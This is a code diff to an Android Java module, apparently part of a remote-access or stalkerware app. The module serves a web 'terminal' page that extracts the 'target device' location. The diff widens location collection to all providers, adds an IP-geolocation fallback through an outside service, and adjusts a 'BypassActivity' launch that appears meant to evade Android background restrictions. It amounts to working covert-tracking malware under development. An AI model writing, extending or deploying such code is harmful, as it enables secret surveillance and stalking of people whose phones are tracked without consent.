@@ -49,7 +49,7 @@ public class LocateModule extends BaseModule {
     private Response serveGpsPage(IHTTPSession session) {
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
         html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
         html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128205; GPS_SATELLITE_UPLINK <span class=\"info-trigger\" onclick=\"showInfo(event, 'GPS_SATELLITE_UPLINK', 'Active tracking and coordinate extraction for the target device.')\">INFO</span></h2>");
@@ -59,7 +59,7 @@ public class LocateModule extends BaseModule {
         html.append("<div id=\"map-overlay\" style=\"position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.8); z-index: 5;\">");
         html.append("<div style=\"text-align: center;\"><div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128225;</div><div style=\"color: var(--neon-cyan); letter-spacing: 2px;\">AWAITING_SATELLITE_FIX</div></div>");
         html.append("</div>");
-        html.append("<iframe id=\"map-frame\" width=\"100%\" height=\"100%\" frameborder=\"0\" style=\"border:0; filter: invert(90%) hue-rotate(180deg); display: none;\" allowfullscreen></iframe>");
+        html.append("<iframe id=\"map-frame\" width=\"100%\" height=\"100%\" frameborder=\"0\" style=\"border:0; display: none;\" allowfullscreen></iframe>");
         html.append("</div>");
 
         html.append("<div class=\"btn-container\" style=\"margin-bottom: 30px; display: flex; justify-content: center; gap: 10px;\">");
@@ -100,9 +100,9 @@ public class LocateModule extends BaseModule {
         if (Build.VERSION.SDK_INT >= 34) {
             try {
                 Intent bypass = new Intent(context, CameraHelper.BypassActivity.class);
-                bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
+                bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
                 context.startActivity(bypass);
-                Thread.sleep(350); 
+                Thread.sleep(150); 
             } catch (Exception ignored) {}
         }
 
@@ -127,26 +127,17 @@ public class LocateModule extends BaseModule {
 
             Location location = null;
 
-            // Try last known location first
-            List<String> providers = locationManager.getProviders(true);
-            Log.d("LocateModule", "Enabled providers: " + providers);
-            for (String provider : providers) {
-                try {
-                    Location l = locationManager.getLastKnownLocation(provider);
-                    if (l == null) continue;
-                    if (location == null || l.getTime() > location.getTime()) {
-                        location = l;
-                    }
-                } catch (SecurityException ignored) {}
-            }
-
-            if (location != null) {
-                long age = System.currentTimeMillis() - location.getTime();
-                Log.d("LocateModule", "Found last known location, age: " + age + "ms");
-                if (age < 30000) { // If less than 30 seconds old, use it immediately
-                    Log.d("LocateModule", "Using fresh last known location");
-                } else {
-                    location = null; // Too old, try fresh fix
+            // Try last known location across ALL providers (gps, network, passive, fused)
+            List<String> allProviders = locationManager.getAllProviders();
+            if (allProviders != null) {
+                for (String provider : allProviders) {
+                    try {
+                        Location l = locationManager.getLastKnownLocation(provider);
+                        if (l == null) continue;
+                        if (location == null || l.getTime() > location.getTime()) {
+                            location = l;
+                        }
+                    } catch (SecurityException ignored) {}
                 }
             }
 
@@ -226,9 +217,9 @@ public class LocateModule extends BaseModule {
                 if (result[0] != null) location = result[0];
             }
 
-            if (location == null) {
+            if (location == null && allProviders != null) {
                 Log.d("LocateModule", "Final attempt: checking last known from all providers");
-                for (String p : providers) {
+                for (String p : allProviders) {
                     try {
                         Location l = locationManager.getLastKnownLocation(p);
                         if (l == null) continue;
@@ -269,6 +260,42 @@ public class LocateModule extends BaseModule {
                 response.addHeader("Location", mapsUrl);
                 return response;
             } else {
+                try {
+                    Log.d("LocateModule", "Attempting IP Geolocation fallback...");
+                    java.net.URL ipUrl = new java.net.URL("http://ip-api.com/json/");
+                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) ipUrl.openConnection();
+                    conn.setConnectTimeout(3000);
+                    conn.setReadTimeout(3000);
+                    if (conn.getResponseCode() == 200) {
+                        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
+                        StringBuilder sb = new StringBuilder();
+                        String line;
+                        while ((line = br.readLine()) != null) sb.append(line);
+                        br.close();
+                        org.json.JSONObject ipJson = new org.json.JSONObject(sb.toString());
+                        if (ipJson.has("lat") && ipJson.has("lon")) {
+                            double lat = ipJson.getDouble("lat");
+                            double lon = ipJson.getDouble("lon");
+                            String city = ipJson.optString("city", "Cellular");
+                            String isp = ipJson.optString("isp", "Network");
+                            Log.d("LocateModule", "IP Geolocation Success: " + lat + ", " + lon + " (" + city + ")");
+                            
+                            if (params.containsKey("json")) {
+                                String json = String.format(Locale.US, "{\"success\": true, \"lat\": %f, \"lon\": %f, \"provider\": \"ip-geolocation (%s)\", \"accuracy\": 1500.0, \"time\": %d}",
+                                        lat, lon, isp, System.currentTimeMillis());
+                                return newResponse(Response.Status.OK, "application/json", json);
+                            }
+                            
+                            String mapsUrl = "https://www.google.com/maps/search/?api=1&query=" + lat + "," + lon;
+                            Response response = newResponse(Response.Status.REDIRECT, "text/html", "");
+                            response.addHeader("Location", mapsUrl);
+                            return response;
+                        }
+                    }
+                } catch (Exception e) {
+                    Log.e("LocateModule", "IP Geolocation Error: " + e.getMessage());
+                }
+
                 String errorMsg = "SATELLITE_LOCK_FAILED: Triangulation timed out. Ensure the device is near a window or has a clear sky view.";
                 if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) && !locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                     errorMsg = "LOCATION_HARDWARE_DISABLED: The user has physically disabled the device's Location toggle.";
